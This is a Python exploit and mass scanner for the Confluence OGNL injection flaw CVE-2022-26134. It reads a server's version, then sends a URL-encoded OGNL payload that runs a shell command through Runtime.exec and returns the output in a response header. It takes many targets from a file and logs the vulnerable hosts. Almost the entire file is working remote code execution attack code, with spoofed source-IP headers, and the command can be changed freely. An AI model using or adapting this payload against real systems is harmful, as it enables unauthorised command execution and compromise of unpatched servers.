# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
import argparse
import re
import requests
import urllib3

# https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 利用脚本
result = [] # 结果


# 添加
endpoints = [
]


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'ADMINCONSOLESESSION=1hDwvQkPnPmLyDpwJvBL1qWTyXLYvQqSlMvJv3h7xyTxz5BJtGm3!1162256454',
    'X-Forwarded-For': '127.0.0.1',
    'X-Client-IP': '127.0.0.1',
    'X-Remote-IP': '127.0.0.1',
    'X-Remote-Addr': '127.0.0.1',
    'X-Originating-IP': '127.0.0.1',
}

proxy = {
    # 'http': '127.0.0.1:8080'
}


def check_target_version(host, socket_proxies):
    try:
        response = requests.get("{}/login.action".format(host),headers=headers, timeout=2, verify=False, proxies=socket_proxies, allow_redirects=False)
        if response.status_code == 200:
            filter_version = re.findall("<span id='footer-build-information'>.*</span>", response.text)
            if (len(filter_version) >= 1):
                version = filter_version[0].split("'>")[1].split('</')[0]
                return version
            else:
                return False
        else:
            return host
    except:
        pass


def send_payload(host, command):
    try:
        response = requests.get(
            "{}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(
                host, command),  headers=headers, timeout=2, verify=False, proxies=socket_proxies, allow_redirects=False)
        if (response.status_code == 302):
            if "bin" in response.headers['X-Cmd-Response']:
                result.append(host + " confluence-cve-2022-26134")
                print(host + '\033[1;31m confluence-cve-2022-26134\033[0m')
            # return response.headers['X-Cmd-Response']
        else:
            return False
    except:
        pass

def save(result):
    file = open('result.txt', 'w')
    for line in result:
        file.write(line + '\n')
    file.close()


def Scan_http(url, socket_proxies):
    version = check_target_version(url,socket_proxies)
    if version:
        print("Confluence target version: {}".format(version))
    else:
        print("Can't find the used version for this target")
    send_payload(url, "ls /")


def fileTarget(file, socket_proxies):
    with open(file) as url_txt:
        urls = url_txt.readlines()
        for url in urls:
            url = url.replace('\n', '')
            Scan_http(url, socket_proxies)
    save(result)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Confluence OgnL scanner')
    parser.add_argument('-f', default=None, help='read target url from file')
    parser.add_argument('-u', default=None, help='target url')
    parser.add_argument('-proxy', default=None, help='-proxy socks5://0.0.0.0:8088')
    args = parser.parse_args()
    socket_proxies = None
    if args.proxy:
        socket_proxies = {
            'http': args.proxy
        }
    if args.u:
        Scan_http(args.u, socket_proxies)
        exit(0)
    if args.f:
        fileTarget(args.f, socket_proxies)
        exit(0)
    else:
        parser.print_help()
        exit(0)
